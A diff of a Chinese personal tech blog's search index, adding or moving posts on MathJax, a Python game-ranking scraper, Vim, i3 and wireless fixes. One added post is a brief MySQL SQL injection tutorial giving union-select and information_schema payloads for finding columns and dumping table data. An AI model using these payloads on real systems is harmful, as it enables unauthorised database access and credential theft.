     <url>/Enable-Tapping-to-Click-with-Libinput-on-Arch-Linux.html</url>
     <content><![CDATA[<blockquote>
@@ -575,26 +544,34 @@
       </tags>
   </entry>
   <entry>
-    <title>在 Hugo 中使用数学公式</title>
-    <url>/Hugo-Mathjax-Support.html</url>
+    <title>EASY SQL_Injection</title>
+    <url>/EASY-SQL-Injection.html</url>
     <content><![CDATA[<blockquote>
-<p>来源: <a href="https://note.qidong.name/2018/03/hugo-mathjax/">在 Hugo 中使用 MathJax</a></p>
+<p>以 <code>mysql</code> 为例， 不同数据库的特殊情况另行整理</p>
 </blockquote>
+<h2 id="0x00-判断注入点"><a href="#0x00-判断注入点" class="headerlink" title="0x00 判断注入点"></a>0x00 判断注入点</h2><p><code>1 and 1=1</code> 返回正常， <code>1 and 1=2</code> 返回错误说明存在注入点<br>(以上为数字型，字符串型应加引号，如 <code>1&#39;and’1&#39;=‘1</code>)</p>
 <span id="more"></span>
 
-<h2 id="本站方案本站已迁移到-Hexo-NexT"><a href="#本站方案本站已迁移到-Hexo-NexT" class="headerlink" title="本站方案本站已迁移到 Hexo &amp; NexT"></a><del>本站方案</del>本站已迁移到 Hexo &amp; NexT</h2><p>本站在添加 MathJax 时，把所有修改写成了一个<code>layouts/partials/mathjax.html</code>文件：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">  <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">async</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">MathJax</span>.<span class="property">Hub</span>.<span class="title class_">Config</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">tex2jax</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">inlineMath</span>: [[<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;$&#x27;</span>], [<span class="string">&#x27;\\(&#x27;</span>,<span class="string">&#x27;\\)&#x27;</span>]],</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">displayMath</span>: [[<span class="string">&#x27;$$&#x27;</span>,<span class="string">&#x27;$$&#x27;</span>], [<span class="string">&#x27;\[\[&#x27;</span>,<span class="string">&#x27;\]\]&#x27;</span>]],</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">processEscapes</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">processEnvironments</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">skipTags</span>: [<span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;noscript&#x27;</span>, <span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;textarea&#x27;</span>, <span class="string">&#x27;pre&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">TeX</span>: &#123; <span class="attr">equationNumbers</span>: &#123; <span class="attr">autoNumber</span>: <span class="string">&quot;AMS&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">           <span class="attr">extensions</span>: [<span class="string">&quot;AMSmath.js&quot;</span>, <span class="string">&quot;AMSsymbols.js&quot;</span>] &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">MathJax</span>.<span class="property">Hub</span>.<span class="title class_">Queue</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// Fix &lt;code&gt; tags after MathJax finishes running. This is a</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// hack to overcome a shortcoming of Markdown. Discussion at</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// https://github.com/mojombo/jekyll/issues/199</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> all = <span class="title class_">MathJax</span>.<span class="property">Hub</span>.<span class="title function_">getAllJax</span>(), i;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; all.<span class="property">length</span>; i += <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          all[i].<span class="title class_">SourceElement</span>().<span class="property">parentNode</span>.<span class="property">className</span> += <span class="string">&#x27; has-jax&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">code</span><span class="selector-class">.has-jax</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font</span>: inherit;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: inherit;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: inherit;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#515151</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里，把官网的三处修改合并成一个 partial。 此外，还把 MathJax 的 CDN 从<code>cdnjs.cloudflare.com</code>替换成了<code>cdn.bootcss.com</code>，更好地支持国内。 因为个人的一些写作习惯，还替换了区块公式的第二标志，从中括号<code>[]</code>换成双中括号。</p>
-<p>把这个 partial 模板添加到<code>&lt;head&gt;</code>中，即可正常工作。</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&#123;&#123; partial <span class="string">&quot;mathjax.html&quot;</span> . &#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x01-判断字段数（列数）"><a href="#0x01-判断字段数（列数）" class="headerlink" title="0x01 判断字段数（列数）"></a>0x01 判断字段数（列数）</h2><p>使用 <code>order by &lt;num&gt;</code> , 根据返回判断列数，当 <code>&lt;num&gt;</code> 大于最大列数时，将返回错误</p>
+<h2 id="0x02-匹配字段位置"><a href="#0x02-匹配字段位置" class="headerlink" title="0x02 匹配字段位置"></a>0x02 匹配字段位置</h2><p>根据字段数构造联合查询语句 <code>id=1 and 1=2 union select 1,2,...n</code> ， <code>n</code> 即为字段数，根据不同数字在页面中出现的位置，选择合适的字段作为 payload 对数据库中的信息进行查询</p>
+<h2 id="0x03-内置函数和系统数据库"><a href="#0x03-内置函数和系统数据库" class="headerlink" title="0x03 内置函数和系统数据库"></a>0x03 内置函数和系统数据库</h2><p>version() 版本信息<br>database() 当前数据库<br>user() 当前用户</p>
+<ul>
+<li><code>and ord(mid(user(),1,1))=114 </code> &#x2F;&#x2F;即 user() 以字母 ’r‘ 开头</li>
+</ul>
+<p>@@global.version_compile_os from mysql.user</p>
+<h2 id="0x04-使用-mysql-的数据库的系统库获取信息"><a href="#0x04-使用-mysql-的数据库的系统库获取信息" class="headerlink" title="0x04 使用 mysql 的数据库的系统库获取信息"></a>0x04 使用 mysql 的数据库的系统库获取信息</h2><p>（mysql 5 以上）information_schema</p>
+<p><code>select SCHEME_NAME from information_schema.SCHEMATA limit 0,1</code> &#x2F;&#x2F;查看库名</p>
+<p><code>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&lt;database&gt; limit 0,1</code> &#x2F;&#x2F;查看表名，<database> 可能需要转为 0xHHHHHHH 的十六进制格式。</p>
+<p><code>select  COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&lt;table&gt; limit 0,1</code>&#x2F;&#x2F;查看列名</p>
+<p><code>select &lt;column_1&gt;,&lt;column_2&gt;,concat(&lt;column_3&gt;,&lt;column_4&gt;) from &lt;table&gt; limit 0,1</code> &#x2F;&#x2F;查看表内信息</p>
+<p>（concat 函数中可以考虑用如 0x3c 之类的标识符进行分割）</p>
+<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>一般数据库中密码都会进行 md5 加密， 因此要获取明文需要对其进行解密</p>
 ]]></content>
       <categories>
-        <category>Tools</category>
+        <category>Penetration</category>
       </categories>
       <tags>
-        <tag>Hugo</tag>
-        <tag>Mathjax</tag>
+        <tag>SQL Injection</tag>
       </tags>
   </entry>
   <entry>
@@ -679,6 +656,24 @@
       </tags>
   </entry>
   <entry>
+    <title>爬取 TapTap 网站上的游戏排行榜信息</title>
+    <url>/TapTap-Spider.html</url>
+    <content><![CDATA[<blockquote>
+<p>爬虫小项目代码存档</p>
+</blockquote>
+<span id="more"></span>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tapspider</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="variable language_">self</span>.responses = <span class="built_in">list</span>()</span><br><span class="line">            <span class="variable language_">self</span>.datas = <span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.get_page()</span><br><span class="line">            <span class="variable language_">self</span>.get_game_info()</span><br><span class="line">            <span class="variable language_">self</span>.save_data(<span class="variable language_">self</span>.datas, <span class="string">&#x27;DownloadList&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_datas</span>(<span class="params">self, code</span>):</span><br><span class="line">        base_url = <span class="string">&#x27;http://www.taptap.com/app/&#x27;</span></span><br><span class="line">        url = base_url+code</span><br><span class="line">        html = <span class="variable language_">self</span>.get_game_page(url)</span><br><span class="line">        result = etree.HTML(html)</span><br><span class="line">        test = -<span class="number">1</span></span><br><span class="line">        free = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        installs = -<span class="number">1</span></span><br><span class="line">        pre_reg = -<span class="number">1</span></span><br><span class="line">        purchases = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        game_info = result.xpath(<span class="string">&quot;//div[@class=&#x27;app-data-wrap&#x27;]/p/span/text()&quot;</span>)</span><br><span class="line">        <span class="comment"># print(node)</span></span><br><span class="line">        <span class="comment"># print(type(node))</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(game_info))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(game_info) == <span class="number">1</span>:</span><br><span class="line">            test = <span class="number">1</span></span><br><span class="line">            installs = -<span class="number">1</span></span><br><span class="line">            pre_reg = -<span class="number">1</span></span><br><span class="line">            purchases = -<span class="number">1</span></span><br><span class="line">            followers = <span class="built_in">str</span>(game_info[<span class="number">0</span>]).replace(<span class="string">&#x27; 人关注&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(game_info[<span class="number">0</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">type</span>(game_info[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;购买&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(game_info[<span class="number">0</span>]):</span><br><span class="line">                purchases = <span class="built_in">str</span>(game_info[<span class="number">0</span>]).replace(<span class="string">&#x27; 人购买&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;安装&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(game_info[<span class="number">0</span>]):</span><br><span class="line">                installs = <span class="built_in">str</span>(game_info[<span class="number">0</span>]).replace(<span class="string">&#x27; 人安装&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                free = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;预约&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(game_info[<span class="number">0</span>]):</span><br><span class="line">                pre_reg = <span class="built_in">str</span>(game_info[<span class="number">0</span>]).replace(<span class="string">&#x27; 人预约&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            followers = <span class="built_in">str</span>(game_info[<span class="number">1</span>]).replace(<span class="string">&#x27; 人关注&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> test, free, installs, pre_reg, purchases ,followers</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_game_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> <span class="variable language_">self</span>.responses:</span><br><span class="line">            html = json.loads(response)[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;html&#x27;</span>]</span><br><span class="line">            results = etree.HTML(html)</span><br><span class="line">            game_list = results.xpath(</span><br><span class="line">                <span class="string">&quot;//div[@class=&#x27;taptap-top-card&#x27;]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">len</span>(game_list))</span><br><span class="line">            response_num = <span class="variable language_">self</span>.responses.index(response)</span><br><span class="line">            <span class="keyword">for</span> game <span class="keyword">in</span> game_list:</span><br><span class="line">                game_num = game_list.index(game)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;正在获取第%d个游戏的信息&#x27;</span> % (response_num*<span class="number">30</span>+game_num+<span class="number">1</span>))</span><br><span class="line">                order = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./span[@class =&#x27;top-card-order-text orange &#x27;]/text() | ./span[@class = &#x27;top-card-order-text  &#x27;]/text() | ./span[@class=&#x27;top-card-order-text  small-font&#x27;]/text()&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">                name = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/a[@class=&#x27;card-middle-title &#x27;]/h4/text()&quot;</span>)[<span class="number">0</span>]).strip().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                developer = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/p[@class=&#x27;card-middle-author&#x27;]/a/text()&quot;</span>)[<span class="number">0</span>]).strip(<span class="string">&#x27;厂商:\xa0&#x27;</span>)</span><br><span class="line">                score = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/div[@class=&#x27;card-middle-score&#x27;]/p/span/text()&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">                description = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/p[@class=&#x27;card-middle-description&#x27;]/text()&quot;</span>)[<span class="number">0</span>]).strip().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                tags = game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/div[@class=&#x27;card-tags&#x27;]/a/text()&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tags)):</span><br><span class="line">                    tags[i] = <span class="built_in">str</span>(tags[i])</span><br><span class="line">                category = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/div[@class=&#x27;card-middle-category&#x27;]/a/text()&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">                game_code = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/a[@class=&#x27;card-middle-title &#x27;]/@href&quot;</span>)[<span class="number">0</span>]).replace(<span class="string">&#x27;https://www.taptap.com/app/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                test, free, installs, pre_reg, purchases ,followers = <span class="variable language_">self</span>.get_datas(game_code)</span><br><span class="line"></span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">&#x27;order&#x27;</span>: order,</span><br><span class="line">                    <span class="string">&#x27;code&#x27;</span>: game_code,</span><br><span class="line">                    <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">                    <span class="string">&#x27;developer&#x27;</span>: developer,</span><br><span class="line">                    <span class="string">&#x27;score&#x27;</span>: score,</span><br><span class="line">                    <span class="string">&#x27;description&#x27;</span>: description,</span><br><span class="line">                    <span class="string">&#x27;tags&#x27;</span>: tags,</span><br><span class="line">                    <span class="string">&#x27;category&#x27;</span>: category,</span><br><span class="line">                    <span class="string">&#x27;free&#x27;</span>: free,</span><br><span class="line">                    <span class="string">&#x27;test&#x27;</span>: test,</span><br><span class="line">                    <span class="string">&#x27;followers&#x27;</span>: followers,</span><br><span class="line">                    <span class="string">&#x27;installs&#x27;</span>: installs,</span><br><span class="line">                    <span class="string">&#x27;purchases&#x27;</span>: purchases,</span><br><span class="line">                    <span class="string">&#x27;pre_reg&#x27;</span>: pre_reg</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="variable language_">self</span>.datas.append(data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;共有%d个游戏&#x27;</span> % <span class="built_in">len</span>(<span class="variable language_">self</span>.datas))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">self</span>):</span><br><span class="line">        base_url = <span class="string">&quot;http://www.taptap.com/ajax/top/download?&quot;</span></span><br><span class="line">        <span class="comment"># 1:30, 2:30, 3:90</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            page = <span class="built_in">str</span>(i+<span class="number">1</span>)</span><br><span class="line">            total = <span class="built_in">str</span>((i)*<span class="number">30</span>)</span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;page&#x27;</span>: page,</span><br><span class="line">                <span class="string">&#x27;total&#x27;</span>: total</span><br><span class="line">            &#125;</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Usr-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">            response = requests.get(</span><br><span class="line">                base_url, params=params, headers=headers)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;正在获取页面内容...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Page:&#x27;</span>, response.url, <span class="string">&#x27;\tstatus code:&#x27;</span>,</span><br><span class="line">                  response.status_code, <span class="string">&#x27;\tlength:&#x27;</span>, <span class="built_in">len</span>(response.text))</span><br><span class="line">            <span class="variable language_">self</span>.responses.append(response.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_game_page</span>(<span class="params">self, url</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Usr-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">        response = requests.get(</span><br><span class="line">            url,  headers=headers)</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_data</span>(<span class="params">self,datas, list_type</span>):</span><br><span class="line">        date = time.strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>, time.localtime())</span><br><span class="line">        filename = list_type +date +<span class="string">&#x27;.pkl&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>+filename,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle.dump(datas,f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    spider = Tapspider()</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;用时：&#x27;</span>, end-start)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>spider</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Recover Removed Files on Linux</title>
     <url>/Recover-Removed-Files-on-Linux.html</url>
     <content><![CDATA[<h1 id="0x00-确定删除文件所在分区"><a href="#0x00-确定删除文件所在分区" class="headerlink" title="0x00 确定删除文件所在分区"></a>0x00 确定删除文件所在分区</h1><p><code>$ df &lt;被删除文件所在文件夹&gt;</code></p>
@@ -704,6 +699,165 @@
       </categories>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Translate Words in Commandline</title>
+    <url>/Translate-Words-in-Commandline.html</url>
+    <content><![CDATA[<p>为了在 Linux 上方便快捷地查询生词，使用了一个 Python 脚本爬取有道词典上的释义，代码更改自<a href="https://www.jianshu.com/p/2d5bcd87594e">此文章</a><br>可以在命令行中通过以下命令查询单词<br><code>fy &lt;word&gt;</code></p>
+]]></content>
+      <categories>
+        <category>Tools</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Tools</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vim Cheat Sheet</title>
+    <url>/Vim-Cheat-Sheet.html</url>
+    <content><![CDATA[<blockquote>
+<p>ref: <a href="http://example.com/">Vim Cheat Sheet</a>.</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="命令模式："><a href="#命令模式：" class="headerlink" title="命令模式："></a>命令模式：</h3><ul>
+<li>i 切换到输入模式，以输入字符。</li>
+<li>x 删除当前光标所在处的字符。</li>
+<li>: 切换到底线命令模式，以在最底一行输入命令</li>
+<li>h 光标向左移动一个字符</li>
+<li>j 光标向下移动一个字符</li>
+<li>k 光标向上移动一个字符</li>
+<li>l 光标向右移动一个字符</li>
+<li>gg 动到这个档案的第一行，相当于 1G</li>
+<li>G 移动到这个档案的最后一行(常用)</li>
+<li>n n 为数字。移动到这个档案的第 n 行</li>
+<li>n<Enter> n 为数字。光标向下移动 n 行</li>
+<li>x 在一行字当中，x 为向后删除一个字符，X 为向前删除一个字符</li>
+<li>nx n 为数字，连续向后删除 n 个字符</li>
+<li>d 删除游标所在的那一整行</li>
+<li>n n 为数字。删除光标所在的向下 n 行</li>
+<li>u 复原前一个动作</li>
+<li>[Ctrl]+r 重做上一个动作</li>
+<li>y 复制游标所在的那一行(常用)</li>
+<li>n n 为数字，复制光标所在的向下 n 行<!-- more --></li>
+</ul>
+<h3 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h3><ul>
+<li>ESC 退出输入模式，切换到命令模式</li>
+<li>HOME&#x2F;END 移动光标到行首&#x2F;行尾</li>
+<li>PageUp&#x2F;PageDown 上&#x2F;下翻页</li>
+<li>Insert 切换光标为输入&#x2F;替换模式，光标将变成竖线&#x2F;下划线</li>
+</ul>
+<h3 id="底线命令模式"><a href="#底线命令模式" class="headerlink" title="底线命令模式"></a>底线命令模式</h3></h3><ul>
+<li>:q 退出程序</li>
+<li>:w 保存文件</li>
+<li>:wq 保存并退出</li>
+<li>:q! 存退出</li>
+<li>:w [filename] 将编辑的数据储存成另一个档案（类似另存新档）</li>
+<li>:r [filename] 在编辑的数据中，读入另一个档案的数据</li>
+<li>:n1,n2 w [filenam] 将 n1 到 n2 的内容储存成 filename 这个档案</li>
+<li>:! comman 暂时离开 vi 到指令行模式下执行 command 的显示结果</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Tools</category>
+      </categories>
+      <tags>
+        <tag>Tools</tag>
+        <tag>Vim</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Use I3 on Arch Linux</title>
+    <url>/Use-i3-on-Arch-Linux.html</url>
+    <content><![CDATA[<blockquote>
+<p>i3 is a tiling window manager, completely written from scratch. The target platforms are GNU&#x2F;Linux and BSD operating systems, our code is Free and Open Source Software (FOSS) under the BSD license. i3 is primarily targeted at advanced users and developers.</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="0x00-i3-的安装与启动"><a href="#0x00-i3-的安装与启动" class="headerlink" title="0x00 i3 的安装与启动"></a>0x00 i3 的安装与启动</h1><p>安装 i3-gaps , i3-gaps 比 i3 有更多特性， 更加美观。</p>
+<p><code>sudo pacman -S i3-gaps</code></p>
+<p>因为我之前使用的桌面是 GNOME，所以可以直接使用 GDM(the GNOME Display Manger) 进行启动， 输入密码之后，在 <code>Sign in</code> 按钮旁边的小齿轮菜单中选择 i3 再登陆即可。</p>
+<p>i3 的配置文件在 ~&#x2F;.config&#x2F;i3&#x2F;config ,可以根据自己的喜好配置快捷键和自启动程序。</p>
+<h1 id="0x01-其他工具"><a href="#0x01-其他工具" class="headerlink" title="0x01 其他工具"></a>0x01 其他工具</h1><ul>
+<li>终端 <code>sakura</code></li>
+<li>状态栏 <code>Polybar</code></li>
+<li>窗口管理器 <code>Compton</code></li>
+<li>程序启动器 <code>rofi</code></li>
+<li>输入法 <code>ibus-libpinyin</code> (因为未知原因无法识别到 fcitx 输入法)</li>
+<li>桌面 <code>feh</code></li>
+<li>命令行网易云音乐 <code>musicbox</code></li>
+<li>蓝牙管理软件 <code>blueman</code></li>
+<li>网络管理软件 <code>nm-applet</code></li>
+<li>浏览器 <code>chromium</code></li>
+<li>文件管理器 <code>ranger</code></li>
+<li>锁屏软件 <code>i3lock-fancy-git</code><sup>AUR<sup></li>
+</ul>
+<p>以上软件大部分都可以直接使用 pacman 包管理工具进行安装。部分软件需要设置自动运行，在 i3 的配置文件中进行修改即可。Polybar 参考<a href="https://github.com/Dimerbone/dotfiles">此配置</a>，具体使用可以查看 Wiki 。</p>
+]]></content>
+      <categories>
+        <category>Tools</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>i3WM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Wireless Interface Hard-Blocked</title>
+    <url>/Wireless-Interface-Hard-Blocked.html</url>
+    <content><![CDATA[<blockquote>
+<p>安装 networkmanager 后执行 <code>$ nmcli dev</code> , 发现无线网卡 wlp3s0 的状态为 unavailable</p>
+</blockquote>
+<span id="more"></span>
+
+<p>执行命令 <code>$ sudo rekill list</code> 发现无线网卡状态为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">soft blocked   no</span><br><span class="line">hard blocked   yes</span><br></pre></td></tr></table></figure>
+
+<h1 id="查找资料后发现这是由于硬件开关未打开导致的。但是现在笔记本电脑上并没有网卡开关，因此直接禁用联想的无线模块即可"><a href="#查找资料后发现这是由于硬件开关未打开导致的。但是现在笔记本电脑上并没有网卡开关，因此直接禁用联想的无线模块即可" class="headerlink" title="查找资料后发现这是由于硬件开关未打开导致的。但是现在笔记本电脑上并没有网卡开关，因此直接禁用联想的无线模块即可"></a>查找资料后发现这是由于硬件开关未打开导致的。但是现在笔记本电脑上并没有网卡开关，因此直接禁用联想的无线模块即可</h1><ul>
+<li><p>在黑名单中加入 ideapad_laptop</p>
+<p><code>$ sudo vim /etc/modprobe.d/ideapad.conf</code></p>
+<p>在第一行加入</p>
+<p><code>blacklist ideapad_laptop</code></p>
+<p>保存并退出</p>
+</li>
+<li><p>执行 <code>$ sudo modprobe -r ideapad_laptop</code></p>
+<p>这时键盘可能会失效，直接按关机键重启即可</p>
+</li>
+<li><p>重启后再次执行 <code>$ rekill list</code> 显示为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">soft blocked   no</span><br><span class="line">hard blocked   no</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这时就可以使用无线网卡了</p>
+]]></content>
+      <categories>
+        <category>Tools</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在 Hugo 中使用数学公式</title>
+    <url>/Hugo-Mathjax-Support.html</url>
+    <content><![CDATA[<blockquote>
+<p>来源: <a href="https://note.qidong.name/2018/03/hugo-mathjax/">在 Hugo 中使用 MathJax</a></p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="本站方案本站已迁移到-Hexo-NexT"><a href="#本站方案本站已迁移到-Hexo-NexT" class="headerlink" title="本站方案本站已迁移到 Hexo &amp; NexT"></a><del>本站方案</del>本站已迁移到 Hexo &amp; NexT</h2><p>本站在添加 MathJax 时，把所有修改写成了一个<code>layouts/partials/mathjax.html</code>文件：</p>
